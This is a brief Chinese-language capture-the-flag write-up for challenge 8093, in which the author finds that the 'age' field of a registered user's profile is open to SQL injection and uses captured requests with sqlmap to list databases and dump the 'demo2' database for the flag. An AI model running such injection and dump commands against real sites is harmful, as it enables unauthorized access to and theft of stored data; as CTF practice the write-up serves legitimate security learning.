8093

!!! 切记不要用虚拟环境中kali的sqlmap


首先访问网站
![img.png](img/img.png)
发现是登陆题，尝试使用sql注入，发现无注入点，尝试在注册中注入，无效登陆后发现age为注入点

抓包并保存
![img_1.png](img/img_1.png)
![img_2.png](img/img_2.png)
使用sqlamp -r demo --batch --dbs
可以跑出数据库
![img_3.png](img/img_3.png)
使用sqlmap -r demo --batch -D demo2 --dump即可获取flag
![img_4.png](img/img_4.png)
